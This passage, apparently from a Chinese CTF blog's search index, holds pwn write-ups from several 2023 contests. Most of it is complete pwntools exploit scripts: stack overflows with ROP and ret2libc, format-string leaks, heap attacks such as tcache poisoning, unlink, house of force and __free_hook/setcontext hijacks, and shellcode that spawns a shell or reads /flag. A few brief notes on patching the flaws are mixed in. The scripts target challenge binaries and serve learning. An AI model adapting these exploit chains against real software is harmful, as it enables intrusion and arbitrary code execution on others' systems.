248pop_5_ret = libc_rop.find_gadget(['pop rbx','pop rbp','pop r13','pop r14','pop r15','ret'])[0] # pop 5*;ret  # libc.2.31 9.12#lss('pop_5_ret')#gdb.attach(io)fake_IO_FILE  = p64(8)fake_IO_FILE += p64(RCE) # callfake_IO_FILE += p64(0) +p64(1) # _IO_write_base # _IO_write_ptrfake_IO_FILE += p64(fake_IO_addr) # fp-&gt;_IO_write_ptrfake_IO_FILE += p64(rdi) + p64(heap_base) + p64(rsi) + p64(0x1000) + p64(rdx) + p64(7) # pop*5 to mefake_IO_FILE += p64(fake_IO_addr+0xc0)fake_IO_FILE += p64(mprotect)fake_IO_FILE += p64(shellcode_addr)fake_IO_FILE  = fake_IO_FILE.ljust(0x90,b'\\x00')fake_IO_FILE += p64(fake_IO_addr+0x10)fake_IO_FILE += p64(pop_5_ret) # setcontext Tow CALL #need pop * 5 ;retfake_IO_FILE  = fake_IO_FILE.ljust(0xb0,b'\\x00')fake_IO_FILE += p64(1) # modefake_IO_FILE  = fake_IO_FILE.ljust(0xc8,b'\\x00')fake_IO_FILE += p64(_IO_wfile_jumps + 0x30)fake_IO_FILE  = fake_IO_FILE.ljust(0xe0,b'\\x00')fake_IO_FILE += p64(fake_IO_addr)fake_IO_FILE += asm(shellcraft.cat('/flag'))add(0x400,fake_IO_FILE)lss('libc_base')lss('heap_base')lss('_IO_list_all')#gdb.attach(io,'brva 0x001354')#gdb.attach(io,'b *_IO_switch_to_wget_mode')#rm(1)ru('&gt;&gt; \\n')sl('4')io.interactive()‍fix‍  方法1直接减少最大堆块数量‍​​fix 后​​‍  方法2‍正常情况下 加10个 删 10个​​​​但是呢，主要还是free 后的结构体 +0x8 这个残留，导致漏洞百出​​​​‍fix前​​​​fix 后​​mov rdi,[rax+8]mov qword ptr [qword_4060],rdimov qword ptr [rax+0x10],0mov qword ptr [rax+8],0​​‍没有残留了‍​​​​‍‍how2stack‍‍程序分析‍nbytes 可控，栈溢出是必然存在的‍​​‍Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x00018A0continue#stack 40'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()def add(size,text):    ru('Your choice: ')    sl('1')    ru('Length: ')    sl(str(size))    ru('Data: ')    s(text)#gdb.attach(io,'brva 0x00018A0')pay = b'A' * 0x64pay += b'\\xff' * 4add(0x68,pay)ru('ff '*4)stack =  uu64(bytes.fromhex(io.recvline()[:-1].replace(b' ',b'').decode()))pay = b'A' * 0x64pay += b'\\xff' * 4pay += p64(stack+48)add(len(pay),pay)ru('Result in hex: ')libc_addr =  uu64(bytes.fromhex(io.recvline()[:-1].replace(b' ',b'').decode()))libc_base = libc_addr - 147587libc = elf.libclibc.address = libc_baselibc_rop = ROP(libc)mprotect        = libc.sym['mprotect']rax = libc_rop.find_gadget(['pop rax','ret'])[0]rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]pay = b'A' * 0x64pay += b'\\xff' * 4pay += p64(stack+48)pay  = pay.ljust(0x78,b'\\x00')pay += p64(rdi) + p64(stack &amp; 0xFFFFFFFFFFFFF000)pay += p64(rsi) + p64(0x3000)pay += p64(rdx) + p64(7) * 2pay += p64(mprotect)pay += p64(stack+88)pay += asm(shellcraft.cat('/flag'))#db.attach(io,'brva 0x0000177E')lss('stack')lss('libc_base')gdb.attach(io,'brva 0x018E4')add(len(pay),pay)io.interactive()‍fix‍直接写死 0x60‍​​‍‍ezgame‍程序分析‍‍漏洞 gets() 溢出,‍​​看看上面那个函数 sub_4015F7(100LL, 1100LL, 10LL, 30LL, 15LL);​‍​​‍Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()# 增加攻击值for i in range(200):    ru('&gt; ')    sl('2')    ru('What kind of monster do you want to fight?\\n')    sl('0')    ru('&gt; ')    sl('2')    ru('What kind of monster do you want to fight?\\n')    sl('1')##ru('&gt; ')#sl('1')# 后面直接 溢出 然后正常 ROP ret2libc 就行了rop = ROP(binary)libc = elf.libc#gdb.attach(io,'b *0x04017FC')ru('&gt; ')sl('2')ru('What kind of monster do you want to fight?\\n')sl('2')pay = b'A' * 0x658pay += p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x401749)sl(pay)ru('are increased.\\n')x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh\\x00'))lss('x')ru('What kind of monster do you want to fight?\\n')sl('2')pay = b'A' * 0x658pay += p64(rop.find_gadget(['pop rdi','ret'])[0]+1) +p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(0x401749)sl(pay)io.interactive()‍‍fix‍  fix 前 gets(v1)溢出​​​​‍直接patch 成一个 sys_call read , 正常读取内容 但是限制输入长度‍‍​​‍这样应该是没问题的‍"
  },
  
  {
    "title": "2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps",
    "url": "/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-11-19 20:00:00 +0800",
    





    
    "snippet": "‍‍‍pwn-pwn0402‍​​​​‍  我们采用溢出后再次read  然后写shellcode 在栈上ret‍​​‍​​from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)s...",
    "content": "‍‍‍pwn-pwn0402‍​​​​‍  我们采用溢出后再次read  然后写shellcode 在栈上ret‍​​‍​​from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn0402'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()main = 0x400A05d1 = bytes.fromhex('90f8e3bffef9f2bf')[::-1]ru('secret: ')x = int(io.recvline(),16)rdx_rsi = 0x0000000000442b89 # pop rdx ; pop rsi ; retrax     = 0x000000000041f6b4 # pop rax ; retxsh = 0x00000000004c1aa7 # xor byte ptr [rdx], al ; retgdb.attach(io,'b *0x0400ABF')print(hex(x))binsh = x + 3498p = b''.ljust(0x98,b'\\x90')p += p64(rdx_rsi)p += p64(0x100) + p64(x + 200)p += p64(0x4016e6) #rdip += p64(0)p += p64(0x0412ECB) # read sl(p)pause()sl(p64(x+210)+b'\\x90'*20+asm(shellcraft.sh()))‍call read 的地址也可以调整下‍​​‍‍pwn-orw_h1‍libc 2.27 __free_hook 打 setcontext‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './orw_h1'libelf = './libc-2.27.so'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()def add(size,text='A'):    sla('&gt;&gt; ','1')    sla('tion:\\n',str(size))    sla('tion:\\n',text)def rm(idx):    sla('&gt;&gt; ','2')    sla('index: ',str(idx))def edit(idx,text):    sla('&gt;&gt; ','3')    sla('index: ',str(idx))    sla('tion:\\n',text)def show(idx):    sla('&gt;&gt; ','4')    sla('index: ',str(idx))add(0x500) # idx0add(0x100) # idx1rm(0)show(0)main_arena= uu64(r(6))libc_base = main_arena - 4111520__free_hook = libc_base + libc.sym['__free_hook']setcontext = libc_base + libc.sym['setcontext']mprotect = libc_base + libc.sym['mprotect']add(0x500) # idx2rdi = libc_base + 0x2164frsi = libc_base + 0x23a6ardx = libc_base + 0x1b96ret = libc_base + 0x8aaadd(0x100) # idx3add(0x100) # idx4rm(1)rm(3)edit(3,p64(__free_hook)*2)pay = b'\\x41' *0xa0+ p64(__free_hook+0x10) + p64(ret)edit(2,pay)add(0x100) #idx5add(0x100) #idx6 free_hook_addrpay = p64(setcontext + 53) + p64(0x0) + p64(rdi) + p64(__free_hook &amp;0xfffffffffffff000) + p64(rsi) + p64(0x1000) + p64(rdx) + p64(7) + p64(mprotect)pay += p64(__free_hook + len(pay)+8)pay += asm(shellcraft.cat('/flag'))edit(6,pay)ls(hex(libc_base))ls(hex(__free_hook))gdb.attach(io,'b *$rebase(0x00E60)')rm(2)io.interactive()‍‍‍pwn1-ez_pwn2‍存在 RWX段  stack不能获取shell,但是可以 ORW​​‍stack RWX, 程序会输出一个stack地址, 存在栈溢出输入的buf 不够 ORW shellcode,所以我们先一个构造一个read 二次写ORW shellcode 到栈上去执行‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './ez_pwn2'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('110.110.110.111',49165)ru('shh: ')x=  int(r(len('0x7ffce2bcc3c0')),16)lss('x')#gdb.attach(io)# 构造一个readsc = f'''mov rsi,{x}mov rdx,0x200syscall'''pay = asm(sc)pay = pay.ljust(0x28,b'A')pay +=  p64(x)sl(pay)pause()# ORWsc = shellcraft.open('/flag')sc += shellcraft.read('rax','rsp',0x40)sc += shellcraft.write(1,'rsp',0x40)pay = len(pay) * b'\\x90' + asm(sc)sl(pay)io.interactive()‍​​‍‍pwn2-drunk2‍一道  libc 2.31 的堆体存在 UAF 漏洞‍正常只可以 malloc 0x40 但是 tcache 填满后 进入的 fastbin ,并不能进入unsortedbin泄露libc存在一个 gift 可以 malloc 一个 0x90 的heap chunk‍修改正常 的 tcachebins  链表，然后控制 tcachebin struct, 将 0x90 的堆块链表数量改成7​​然后再利用上面的漏洞 打堆块重叠 去free 0x90 进入 unsortedbin 泄露libc​​后面直接打 __free_hook​​‍‍  exploit‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './drunk2'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('110.110.110.111',49178)def add(size,text):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('1')    ru('What size cup:\\n')    sl(str(size))    ru('something to add?\\n')    sl(text)def rm(idx):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('2')    ru('cup number: \\n')    sl(str(idx))def show(idx):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('3')    ru('you have left: \\n')    sl(str(idx))def edit(idx,text):    ru('--&gt;&gt;&gt;&gt; \\n')    sl('4')    ru('which cup:\\n')    sl(str(idx))    ru('refill')    sl(text)def bd():    ru('--&gt;&gt;&gt;&gt; \\n')    sl('888')libc = elf.libcbd()add(0x38,'A') # 0add(0x38,'B') # 1rm(1)rm(0)show(0)heap_base = uu64(r(6)) - 0x370edit(0,p64(heap_base + 0x10))pay = b'\\x00' * 0x0e + b'\\x07'add(0x38,'exp1') # 2add(0x38,pay) # 3# exp 2add(0x38,'A') # 4add(0x38,'B') # 5rm(4)rm(5)edit(5,p64(heap_base + 0x2a0))add(0x38,'6') # 6add(0x38,'7') # 7rm(7)show(7)libc_base = uu64(r(6)) - 2018272__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']add(0x38,'/bin/sh\\x00') # 8add(0x38,'B') # 9add(0x38,'/bin/sh\\x00') # 8add(0x38,'B') # 9rm(10)rm(11)edit(11,p64(__free_hook))add(0x38,'/bin/sh\\x00') # 8add(0x38,p64(system)) # 9lss('heap_base')lss('libc_base')#gdb.attach(io)rm(7)io.interactive()​​‍"
  },
  
  {
    "title": "2023羊城杯-决赛Pwn-Writeups",
    "url": "/posts/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF-%E5%86%B3%E8%B5%9BPwn-Writeups/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-09-09 20:00:00 +0800",
    





    
    "snippet": "‍‍‍​​‍‍PWN-arrary_index_bank‍‍程序功能1 可以泄露stack 上的数据 如 stack_addr 和 elf_addr 等2 修改一个stack[idx] ;idx !&gt; you ;you = 1  修改 stack[idx] 处的数据3 存在后 system(“\\/bin/sh”)4 漏洞点 可以修改 -idx 处 ,只要计算好 idx 就可以 从 st...",
    "content": "‍‍‍​​‍‍PWN-arrary_index_bank‍‍程序功能1 可以泄露stack 上的数据 如 stack_addr 和 elf_addr 等2 修改一个stack[idx] ;idx !&gt; you ;you = 1  修改 stack[idx] 处的数据3 存在后 system(“\\/bin/sh”)4 漏洞点 可以修改 -idx 处 ,只要计算好 idx 就可以 从 stack 0x7f 处 到 elf 0x55 处，从而修改 elf 上的you 值‍‍​jle 跳转 也就是可以输入 负数‍‍​​‍‍​​‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote('')    else:        return process([binary] + argv, *a, **kw)gdbscript = '''#b *$rebase(0x0144D)b *$rebase(0x00014C6)continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)def show(idx):    ru('&gt; ')    sl('1')    ru('Whose account?\\n')    sl(str(idx))    ru('] =')    return int(io.recvline())def edit(idx,num):    ru('&gt; ')    sl('2')    ru('Whose account?\\n')    sl(str(idx))    ru('How much?\\n')    sl(str(num))elf_addr    = show(-1) - 5158stack_addr  = show(-2) - 0x30you         = elf_addr + 0x04010win         = elf_addr + 0x01318pad =  you - stack_addrpad = pad // 8edit(pad,0x10)  #  关键点  修改you 为 0x10edit(9,win) # 修改函数返回地址sl('') # retrun ls(hex(elf_addr))ls(hex(stack_addr))#ls(hex(ret_addr))io.interactive()‍PWN-Printf_but_not_fmtstr‍  直接unlink做forge_chunk-&gt;fd # 这个fd 指向的chunk-&gt;bk 位置的值必须是 forge_chunk 的地址from pwn import *binary  = './pwn'libc    = './libc.so.6'ld      = './ld-linux-x86-64.so.2'#io = process([ld,binary,])context.terminal = ['tmux','splitw','-h']io = process([ld,binary],env={'LD_PRELOAD':'./libc.so.6'})io = remote('192.168.31.155',50038)#context.terminal  = ['tmux','splitw','-h','-l','130']context.log_level = 'debug'def ru(x): return io.recvuntil(x)def sl(x): io.sendline(x)def s(x): io.send(x)def add(idx,size):    ru('&gt;')    sl('1')    ru('Index: ')    sl(str(idx))    ru('Size: ')    sl(str(size))def rm(idx):    ru('&gt;')    sl('2')    ru('Index: ')    sl(str(idx))def edit(idx,text):    ru('&gt;')    sl('3')    ru('Index: ')    sl(str(idx))    ru(': ')    s(text)def show(idx):    ru('&gt;')    sl('4')    ru('Index: ')    sl(str(idx))add(0,0x508)add(1,0x508)#add(2,0x508)rm(0)show(0)ru(b'Content: ')min_arena = u64(ru('\\n')[:-1].ljust(8,b'\\x00'))libc_base = min_arena -  2059456log.success(hex(libc_base))ta = 0x4040E0fd = ta - 0x18bk = ta - 0x10pay = p64(0) + p64(0x501)pay += p64(fd) + p64(bk)pay = pay.ljust(0x500,b'\\x00')pay += p64(0x500)edit(0,pay)rm(1) # idx0 idx1 都进入topchunk # 合并后topchunk 的size 位置在我们伪造的size 看图win  = 0x4011D6puts = 0x404018 # gotpay  = p64(0) * 3pay += p64(fd)pay += p64(puts)edit(0,pay)#gdb.attach(io)edit(1,p64(win))io.interactive()​​‍forge_chunk-&gt;fd # 这个fd 指向的chunk-&gt;bk 位置的值必须是 forge_chunk 的地址​‍‍‍‍‍‍‍​idx0也加入 topchunk‍​​‍‍‍‍‍PWN-easy_force‍      house of force    libc2.23 可以用  申请大小没有限制​​‍‍利用堆溢出，覆盖top_chunk 的size 为 0xFFFFFFFFFFFFFFFF​‍‍​​‍‍然后 就可以任意地址申请了‍target_addr = 0x602040# 想申请到这个地址topchunk_addr = 0x602040 # touchunk 在堆上的地址size = target - topchunk_addr - 0x20 # payadd(idx,size,'xx')add size 后 heap 块就来到了这里，都会再申请 就在这里了​​‍再次add 一个‍add(3,0x20,'AAAAAAA')‍此时我们再看一下target_addr里的内容 malloc 已经被修改，达到目的‍​​‍exploit‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))#ls      = lambda data               :log.success(data)ls = lambda s            : log.success('\\033[1;31;40m %s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote('192.168.31.155',50039)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = './libc-2.23.so'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)def add(idx,size,text):    ru('4.go away\\n')    sl('1')    ru('which index?\\n')    sl(str(idx))    ru('how much space do u want?\\n')    sl(str(size))    ru('now what to write?\\n')    s(text)    ru('on ')    x = int(ru(' is'),16)    return(x)x = add(0,0x30000,'AA')libc_base = x - 6008848x = add(1,0x8,p64(0)*3+p64(0xFFFFFFFFFFFFFFFF))top_chunk = x + 0x10target = 0x602040size = target - top_chunk - 0x20ls('top_chunk')ls('libc_base')add(2,size,'xx')o = [0x45226,0x4527a,0xf03a4,0xf1247][0] + libc_base#o = 0x400990#add(3,0x20,'AAAAAAA')add(3,0x20,p64(o))#gdb.attach(io)sl('1')sl('4') # idxsl('0') # sizeio.interactive()​"
  },
  
  {
    "title": "NSSCTF-Round-14-Basic",
    "url": "/posts/NSSCTF-Round-14-Basic/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-07-30 00:00:00 +0800",
    





    
    "snippet": "‍‍​‍  5 道pwn 题‍love存在 格式化字符串漏洞​​‍然后进入 vuln 函数，然后直接溢出,由于上面需要的libc_base Canary 都已经有了，可以直接 return system(“/bin/sh”);​​  exploit 非预期from pwn import *s       = lambda data               :io.send(data)sa...",
    "content": "‍‍​‍  5 道pwn 题‍love存在 格式化字符串漏洞​​‍然后进入 vuln 函数，然后直接溢出,由于上面需要的libc_base Canary 都已经有了，可以直接 return system(“/bin/sh”);​​  exploit 非预期from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x40131Bcontinue'''.format(**locals())binary = './pwn'libelf = './libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.anna.nssctf.cn',28753)#09:0048│     0x7ffc410fe908 ◂— 0x10140a8aa00b1300#0b:0058│     0x7ffe19b67ea8 —▸ 0x7ff05691e083 (__libc_start_main+243) ◂— mov edi, eaxpay = f'%520c%9$hn%{0x9+0x6}$p%{0x0b+0x6}$p'ru('Toka\\n\\n')#gdb.attach(io)sl(pay)ru('0x')cann = int(r(16),16)__libc_start_main = int(r(14),16)libc_base = __libc_start_main - 243 - libc.sym['__libc_start_main']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(cann))ls(hex(libc_base))ru('level\\n\\n')pay = 0x28 * b\"A\" + p64(cann)*2 + p64(rop.find_gadget(['ret'])[0])*1 + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(elf.sym['main'])sl(pay)io.interactive()  预期解法​​from ctypes import *from struct import packbanary = \"./love\"elf = ELF(banary)#libc = ELF(\"./libc.so.6\")libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")ip = '127.0.0.1'port = 10005local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = 'debug', os = 'linux', arch = 'amd64')#context(log_level = 'debug', os = 'linux', arch = 'i386')def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00'))uu64 = lambda : u64(io.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\"))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b'\\x00'))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()pop_rdi=0x00000000004013f3puts_plt=elf.plt['puts']puts_got=elf.got['puts']ret=0x000000000040101a#gdb.attach(io,'b *0x000000000040125D')ru(\"I want to hear your praise of Toka\\n\")payload='%'+str(520)+'c'+'%9$hhn'sl(payload)#pause()payload=b'A'*0x28+p64(0xdeadbeef)+b'A'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['vuln'])payload=payload.ljust(0x868,b'\\x00')+p64(0xdeadbeef)*3#payload=b'A'*8ru(\"I know you like him, but you must pass my level\\n\")sl(payload)libcbase=uu64()-libc.sym['puts']lg(\"libcbase:\"+hex(libcbase))system=libcbase+libc.sym['system']bin_sh=libcbase+next(libc.search(b'/bin/sh\\x00'))onegadget=libcbase+0xe3b01ru(\"I know you like him, but you must pass my level\\n\")payload=b'A'*0x28+p64(0xdeadbeef)+b'A'*8+p64(onegadget)sl(payload)ia()‍rbp‍ORW  拿flag‍​​只能溢出 覆盖一个 ret ,需要利用栈迁移​​控制 下一次 rbp 为bss上，然后再次read​​然后写 rop 到 bss 上都会栈迁移也到这里​​​​然后再 leave ret 栈迁移 泄露 libc上的地址‍​​puts 结束后 我们再 返回到 vuln​​​​​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x0x404410continue'''.format(**locals())binary = './rbp'libelf = 